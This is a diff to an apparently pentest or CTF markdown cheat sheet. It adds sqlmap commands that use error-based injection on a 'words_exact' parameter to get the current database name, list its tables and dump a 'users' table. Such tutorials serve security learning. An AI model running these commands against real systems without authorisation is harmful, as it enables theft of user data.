@@ -51,6 +51,18 @@
   - __`-p` ---> payload where you want to use it__
   - __`--technique=E`__
     - > __E= Error based, U= UNION base, B= BOOLEAN base__
+- __`sqlmap -r request -p words_exact --technique=E --current-db`__
+  - __To get the database name here it is `recipes`__
+![image3](Image/sqlmap2.png)
+
+- __If you know the Database name use the below command__
+- __`sqlmap -r request -p words_exact --technique=E -D recipes --tables`__
+  - > __It will display the table names__
+
+- __To dump the table use the below command__
+- __`sqlmap -r request -p words_exact --technique=E -D recipes -T users --dump`__
+
+
 ## [SQL Injection](sql.md)
 ## SQL Login bypass
 ```
